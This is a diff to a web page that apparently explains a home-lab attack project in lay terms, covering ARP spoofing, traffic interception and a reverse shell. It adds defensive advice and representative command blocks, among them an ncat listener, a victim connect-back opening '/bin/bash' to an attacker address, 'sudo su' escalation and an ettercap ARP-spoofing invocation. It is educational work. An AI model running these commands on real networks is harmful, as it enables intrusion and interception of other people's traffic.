@@ -176,7 +176,8 @@
           send anything addressed to one specific door straight through to one device. It works
           like a receptionist with standing instructions to connect anyone who asks for a certain
           extension directly to one particular desk, instead of asking every caller who they are
-          trying to reach.
+          trying to reach. The lab opened two doors this way: one for the reverse shell, and one
+          for the SSH connection used later to retrieve the capture file.
         </p>
 
         <figure class="diagram">
@@ -272,6 +273,15 @@
           <figcaption>How the devices in the lab were found before any interception began.</figcaption>
         </figure>
 
+        <div class="transcript">
+          <p class="transcript-bar">nmap · lab address range</p>
+          <pre><code><b>$ nmap -sn 192.168.1.0/24</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The ping-scan syntax from the report's own reconnaissance step: one request to each
+          address in the range, nothing more.
+        </p>
+
         <p><strong>Watching the traffic, or "network analysis."</strong> To prove the interception
           actually happened, rather than just assume it did, every piece of data moving through
           the lab was recorded with a tool called tcpdump, roughly a dashboard camera that records
@@ -320,6 +330,22 @@
           </ul>
           <figcaption>How the interception was recorded and verified.</figcaption>
         </figure>
+
+        <p>
+          The recording had to reach the analysis machine before anyone could look at it, so it
+          travelled over the second forwarded door: the SSH connection, the same encrypted channel
+          used for a secure remote login, copied across with <code>scp</code> rather than emailed
+          or carried over on a drive.
+        </p>
+        <div class="transcript">
+          <p class="transcript-bar">representative syntax, from the report</p>
+          <pre><code><b>$ tcpdump -i wlan0 -w capture.pcap</b>
+<b>$ scp kali@192.168.1.50:~/capture.pcap ./capture.pcap</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The capture command and the file transfer, written the way the report gives them; not
+          output captured from an actual run.
+        </p>
       </section>
 
       <details class="disclosure">
@@ -336,7 +362,13 @@
         <p>
           That one flip is what makes the extension possible. Outbound connections are what most
           firewalls are configured to allow, so a reverse shell tends to cross boundaries an
-          inbound connection would not.
+          inbound connection would not. It also survives a victim whose address changes, since the
+          victim is the one reaching out to a fixed point rather than the other way around.
+        </p>
+        <p>
+          Getting that shell open still takes a first step somewhere else: a payload has to reach
+          the victim's machine, commonly through phishing, an existing vulnerability, or social
+          engineering, and then actually be run before any of what follows can happen.
         </p>
         <p>
           Once that shell is open, the attacker is no longer limited to commands run from their
@@ -396,22 +428,48 @@
         <p>
           Ettercap did the ARP spoofing and MiTM interception. Netcat, run as <code>ncat</code>
           rather than <code>nc</code> for cross-platform compatibility, opened the reverse shell.
-          MSFVenom generated the payload that triggers it.
+          MSFVenom generated the payload that triggers it, though a short script using a
+          programming language's own networking libraries works the same way.
         </p>
         <p>
           MSFVenom's payloads were not reliable in our testing, which is worth noting on its own.
           A textbook tool chain does not always behave like the textbook.
         </p>
+
+        <div class="transcript">
+          <p class="transcript-bar">representative syntax, from the report</p>
+          <pre><code># Attacker: listen for the victim's connection
+<b>$ ncat -nlvp 4444 -e /bin/bash</b>
+
+# Victim: connect back out to the attacker
+<b>$ ncat 192.168.1.76 4444 -e /bin/bash</b>
+
+# Inside the shell: a regular account, then root
+<b>$ whoami</b>
+<b>$ sudo su</b>
+<b>$ whoami</b>
+
+# Ettercap, run from the now-compromised device
+<b>$ ettercap -T -S -i wlan0 -M arp:remote \</b>
+<b>    /192.168.1.1// /192.168.1.50//</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The listener, the connect-back, the privilege escalation that most of the rest needs,
+          and the Ettercap invocation, written the way the report gives them; not output captured
+          from an actual run.
+        </p>
+
         <p>
           We used <code>tcpdump</code> to capture the attack traffic and <code>Wireshark</code>
           to read it back afterward, which is how the interception was actually verified rather
           than assumed.
         </p>
         <p>
-          The full command sequence is in the written report: the port-forwarding setup, the
-          Ettercap invocation, and the listener and payload commands. It is available on request
-          rather than published inline here, since a copy-paste sequence is a different thing
-          from an explanation of how the technique works.
+          The commands above are representative syntax, not a copy-paste reproduction. The
+          report's own version ties each one to this lab's specific devices and adds a step that
+          pulls a saved Wi-Fi password out of the victim's own network configuration; that step,
+          and the full tied-together sequence, stay out of this page and are available on request
+          instead.
         </p>
       </section>
 
@@ -432,10 +490,11 @@
           when the payload itself is novel.</p>
         <p>
           Network-wide, the same monitoring and firewall discipline is reinforced by DNSSEC
-          against DNS spoofing, key-based SSH authentication in place of passwords, and routine
-          scanning for the kind of remote-access trojans a reverse shell is a form of. None of
-          these measures requires knowing an attack is coming; they are what makes an attack
-          visible, or impossible, if one does.
+          against DNS spoofing, key-based SSH authentication in place of passwords with
+          brute-force protection such as fail2ban behind it, systems kept patched against known
+          vulnerabilities, and routine scanning for the kind of remote-access trojans a reverse
+          shell is a form of. None of these measures requires knowing an attack is coming; they
+          are what makes an attack visible, or impossible, if one does.
         </p>
       </section>
 
